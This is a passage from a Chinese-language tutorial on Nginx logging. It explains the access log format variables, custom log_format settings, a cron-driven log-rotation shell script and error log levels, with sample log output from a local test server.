+0800&#x3002;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#x6700;&#x540E;&#x7684;&#x201D;+0800&#x201D;&#x8868;&#x793A;&#x670D;&#x52A1;&#x5668;&#x6240;&#x5904;&#x65F6;&#x533A;&#x4F4D;&#x4E8E;UTC&#x4E4B;&#x540E;&#x7684;8&#x5C0F;&#x65F6;&#x3002;<br><code>$request</code>&#xFF1A;&#x8BF7;&#x6C42;&#x7684;URI&#x548C;HTTP&#x534F;&#x8BAE;<br><code>$status</code>&#xFF1A;&#x8BB0;&#x5F55;&#x8BF7;&#x6C42;&#x8FD4;&#x56DE;&#x7684;http&#x72B6;&#x6001;&#x7801;<br><code>$body_bytes_sent</code>&#xFF1A;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6587;&#x4EF6;&#x4E3B;&#x4F53;&#x5185;&#x5BB9;&#x7684;&#x5927;&#x5C0F;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x65E5;&#x5FD7;&#x6BCF;&#x6761;&#x8BB0;&#x5F55;&#x4E2D;&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x7D2F;&#x52A0;&#x8D77;&#x6765;&#x4EE5;&#x7C97;&#x7565;&#x4F30;&#x8BA1;&#x670D;&#x52A1;&#x5668;&#x541E;&#x5410;&#x91CF;&#xFF09;<br><code>$http_referer</code>&#xFF1A;&#x8BB0;&#x5F55;&#x4ECE;&#x54EA;&#x4E2A;&#x9875;&#x9762;&#x94FE;&#x63A5;&#x8BBF;&#x95EE;&#x8FC7;&#x6765;&#x7684;&#x3002;<br><code>$http_user_agent</code>&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4FE1;&#x606F;<br><code>$http_x_forwarded_for</code>&#xFF1A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x771F;&#x5B9E;IP&#xFF08;&#x901A;&#x5E38;web&#x670D;&#x52A1;&#x5668;&#x653E;&#x5728;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x7684;&#x540E;&#x9762;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;<code>$request_addr</code>&#x62FF;&#x5230;&#x7684;IP&#x5730;&#x5740;&#x662F;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x3002;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5728;&#x8F6C;&#x53D1;&#x8BF7;&#x6C42;&#x7684;http&#x5934;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x589E;&#x52A0;x_forward_for&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4EE5;&#x8BB0;&#x5F55;&#x539F;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x539F;&#x6765;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF09;<br><code>uptream_status</code>upstream&#x72B6;&#x6001;<br><code>upstream_addr</code>&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x5730;&#x5740;<br><code>ssl_protocol</code>SSL&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982;TLSv1&#x3002;<br><code>ssl_cipher</code>&#x4EA4;&#x6362;&#x6570;&#x636E;&#x4E2D;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;RC4-SHA&#x3002;<br><code>upstream_addr</code>upstream&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5373;&#x771F;&#x6B63;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E3B;&#x673A;&#x5730;&#x5740;&#x3002;<br><code>request_time</code>&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x603B;&#x65F6;&#x95F4;&#x3002;<br><code>upstream_response_time</code>&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;upstream&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;  </p><p><strong>&#x6253;&#x5F00;nginx.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;</strong> <code>vim /usr/local/nginx/nginx.conf</code><br>&#x65E5;&#x5FD7;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF1A;  </p><pre><code># access_log    logs/access.log    main;</code></pre><p>&#x65E5;&#x5FD7;&#x751F;&#x6210;&#x7684;&#x5230;Nginx&#x6839;&#x76EE;&#x5F55;&#x54E6;logs/access.log&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x201D;main&#x201D;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x683C;&#x5F0F;&#x3002;</p><p>&#x9664;&#x4E86;main&#x683C;&#x5F0F;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x5176;&#x4ED6;&#x683C;&#x5F0F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;log_format name(&#x683C;&#x5F0F;&#x540D;&#x79F0;) type(&#x683C;&#x5F0F;&#x6837;&#x5F0F;)</p><p>&#x4F8B;&#x5982;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#log format main &apos;remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line"># &apos;$status $body_bytes_sent &quot;$http_referer&quot;&apos;</span><br><span class="line"># &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line"># access_log logs/access.log    main;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x67E5;&#x770B;NGINX&#x65E5;&#x5FD7;&#xFF1A;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/access.log</span><br><span class="line">&apos;</span><br><span class="line">192.168.73.20 - - [03/Jun/2022:06:09:06 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.73.20 - - [03/Jun/2022:06:09:18 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.73.20 - - [03/Jun/2022:06:09:30 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:06:27:17 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:06:27:17 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:06:28:17 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:06:28:17 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:06:33:36 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:06:33:37 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot;</span><br><span class="line"></span><br><span class="line">&apos;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;"><a href="#Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;" class="headerlink" title="Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;"></a>Nginx&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; vim /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></tbody></table></figure><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">http {</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x542F;&#x7528;&#x65E5;&#x5FD7;&#x683C;&#x5F0F;&#x5316;</span></span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"><span class="comment"># &#x4E0D;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</span></span><br><span class="line">    <span class="comment">#########access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    server {</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        </span><br><span class="line"><span class="comment"># &#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</span></span><br><span class="line">        access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / {</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        }</span><br><span class="line"><span class="comment"># ---------------------------&#x7701;&#x7565;--------------------------------------</span></span><br><span class="line">}</span><br><span class="line"><span class="comment"># ---------------------------&#x7701;&#x7565;--------------------------------------</span></span><br></pre></td></tr></tbody></table></figure><p><strong>&#x67E5;&#x770B;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; nginx -t</span><br><span class="line">nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</span><br><span class="line">[root@rhel76 ~]&amp; systemctl restart nginx</span><br><span class="line">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4F7F;&#x7528;curl&#x8BF7;&#x6C42;nginx&#x4FE1;&#x606F;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos74 ~]&amp; curl -I 192.168.73.24</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.12.2</span><br><span class="line">Date: Fri, 03 Jun 2022 11:55:27 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 612</span><br><span class="line">Last-Modified: Thu, 02 Jun 2022 21:48:43 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: &quot;6299303b-264&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">[root@ctos74 ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Nginx&#x7684;&#x65E5;&#x5FD7;&#x53D8;&#x5316;&#xFF1A;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log  </span><br><span class="line">192.168.73.20 - - [03/Jun/2022:19:55:27 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4F7F;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;nginx&#x670D;&#x52A1;&#xFF1A;</strong>  </p><blockquote><p>&#x8FD9;&#x91CC;&#x4EE5;Microsoft Edge&#x4E3A;&#x4F8B;<br>Edge&#x7248;&#x672C; 102.0.1245.30 (&#x6B63;&#x5F0F;&#x7248;&#x672C;) (64 &#x4F4D;)</p></blockquote><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log</span><br><span class="line">192.168.73.20 - - [03/Jun/2022:19:55:27 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:20:02:33 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot; &quot;-&quot;</span><br><span class="line">192.168.73.1 - - [03/Jun/2022:20:02:33 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot; &quot;-&quot;</span><br></pre></td></tr></tbody></table></figure><h3 id="Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;"><a href="#Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;" class="headerlink" title="Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;"></a>Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;</h3><p>&#x521B;&#x5EFA;nginx&#x65E5;&#x5FD7;&#x6309;&#x6BCF;&#x5206;&#x949F;&#x81EA;&#x52A8;&#x5207;&#x5272;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A;  </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; vim /usr/local/nginx/conf/nginx_log.sh</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x8BBE;&#x7F6E;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x76EE;&#x5F55;</span></span><br><span class="line">LOG_HOME=&quot;/usr/local/nginx/logs/&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x540D;&#x79F0;</span></span><br><span class="line">LOG_PATH_BAK=&quot;$(date -d yesterday +%Y%m%d%H%M)&quot;.nginx666.access.log</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x91CD;&#x547D;&#x540D;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</span></span><br><span class="line">mv ${LOG_HOME}/nginx666.access.log ${LOG_HOME}/${LOG_PATH_BAK}</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5411;nginx&#x4E3B;&#x673A;&#x8FDB;&#x7A0B;&#x53D1;&#x9001;&#x4FE1;&#x53F7;&#xFF0C;&#x91CD;&#x65B0;&#x6253;&#x5F00;&#x65E5;&#x5FD7;</span></span><br><span class="line">kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; chmod +x /usr/local/nginx/conf/nginx_log.sh</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x521B;&#x5EFA;crontab&#x8BBE;&#x7F6E;&#x4F5C;&#x4E1A;</strong>  </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; crontab -e</span><br><span class="line">* * * * * /bin/bash /usr/local/nginx/conf/nginx_log.sh</span><br><span class="line">crontab: installing new crontab</span><br><span class="line">[root@rhel76 ~]&amp;</span><br><span class="line"> 1L, 55C written</span><br><span class="line">[root@rhel76 ~]&amp;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; ls /usr/local/nginx/logs/</span><br><span class="line">access.log  error.log  host.access.log  nginx666.access.log  nginx.pid</span><br><span class="line">[root@rhel76 ~]&amp;</span><br><span class="line">[root@rhel76 ~]&amp; ll /usr/local/nginx/logs/</span><br><span class="line">total 16</span><br><span class="line">-rw-r--r--. 1 root   root    0 Jun  3 20:27 202206022028.nginx666.access.log</span><br><span class="line">-rw-r--r--. 1 root   root 1540 Jun  3 06:33 access.log</span><br><span class="line">-rw-r--r--. 1 nobody root 2741 Jun  3 20:02 error.log</span><br><span class="line">-rw-r--r--. 1 nobody root 2246 Jun  3 20:24 host.access.log</span><br><span class="line">-rw-r--r--. 1 nobody root    0 Jun  3 20:28 nginx666.access.log</span><br><span class="line">-rw-r--r--. 1 root   root    6 Jun  3 20:27 nginx.pid</span><br><span class="line">[root@rhel76 ~]&amp;</span><br><span class="line">[root@rhel76 ~]&amp; ll /usr/local/nginx/logs/</span><br><span class="line">total 24</span><br><span class="line">-rw-r--r--. 1 root   root    0 Jun  3 20:27 202206022028.nginx666.access.log</span><br><span class="line">-rw-r--r--. 1 nobody root   94 Jun  3 20:28 202206022029.nginx666.access.log</span><br><span class="line">-rw-r--r--. 1 root   root 1540 Jun  3 06:33 access.log</span><br><span class="line">-rw-r--r--. 1 nobody root 2741 Jun  3 20:02 error.log</span><br><span class="line">-rw-r--r--. 1 nobody root 2246 Jun  3 20:24 host.access.log</span><br><span class="line">-rw-r--r--. 1 nobody root  188 Jun  3 20:29 nginx666.access.log</span><br><span class="line">-rw-r--r--. 1 root   root    6 Jun  3 20:27 nginx.pid</span><br><span class="line">[root@rhel76 ~]&amp;</span><br></pre></td></tr></tbody></table></figure><h2 id="Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error-log"><a href="#Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error-log" class="headerlink" title="Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error.log"></a>Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error.log</h2><p>&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x8BB0;&#x5F55;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;Nginx&#x51FA;&#x9519;&#x65F6;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x683C;&#x5F0F;&#x4E0D;&#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7CFB;&#x7EDF;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x6216;server&#x7684;&#x6027;&#x80FD;&#x74F6;&#x9888;&#x7B49;&#x3002;   </p><p><strong>Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x51E0;&#x4E2A;&#x7B49;&#x7EA7;</strong><br>error_ log &#x6307;&#x4EE4;&#x7684;&#x7B2C;1&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B58;&#x653E;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x8DEF;&#x5F84;&#x3002;&#x7B2C;2&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;&#x8BE6;&#x7EC6;&#x7A0B;&#x5EA6;&#x7684;&#x7B49;&#x7EA7;,&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;error<br><code>debug</code>&#x3001;<code>info</code>&#x3001;<code>notice</code>&#x3001;<code>warn</code>&#x3001;<code>error</code>&#x548C;<code>crit</code>, &#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x8BE6;&#x7EC6;&#x7A0B;&#x5EA6;&#x4F9D;&#x6B21;&#x9012;&#x51CF;,debug&#x8BB0;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#x6700;&#x8BE6;&#x7EC6;,crit&#x8BB0;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#x6700;&#x7B80;&#x6D01;&#x3002;  </p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 ~]&amp; cat /usr/local/nginx/logs/error.log</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:01 [emerg] 13522#0: still could not bind()</span><br><span class="line">2022/06/03 05:54:09 [notice] 13533#0: signal process started</span><br><span class="line">2022/06/03 05:54:09 [error] 13533#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)</span><br><span class="line">2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)</span><br><span class="line">2022/06/03 05:54:17 [emerg] 13549#0: still could not bind()</span><br><span class="line">2022/06/03 05:54:37 [notice] 13571#0: signal process started</span><br><span class="line">2022/06/03 05:54:37 [error] 13571#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)</span><br><span class="line">2022/06/03 05:54:41 [notice] 13575#0: signal process started</span><br><span class="line">2022/06/03 05:54:41 [error] 13575#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)</span><br><span class="line">2022/06/03 05:55:01 [alert] 13417#0: unlink() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)</span><br><span class="line">2022/06/03 06:27:17 [error] 13613#0: *4 open() &quot;/usr/local/nginx/html/favicon.ico&quot; failed (2: No such file or directory), client: 192.168.73.1, server: localhost, request: &quot;GET /favicon.ico HTTP/1.1&quot;, host: &quot;192.168.73.24&quot;, referrer: &quot;http://192.168.73.24/&quot;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess"><a href="#&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess" class="headerlink" title="&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess"></a>&#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccess</h2><p>GoAccess &#x662F;&#x4E00;&#x6B3E;&#x5F00;&#x6E90;&#x7684;&#x4E14;&#x5177;&#x6709;&#x4EA4;&#x4E92;&#x89C6;&#x56FE;&#x754C;&#x9762;&#x7684;&#x5B9E;&#x65F6; Web &#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#xFF0C;&#x901A;&#x8FC7;&#x4F60;&#x7684; Web 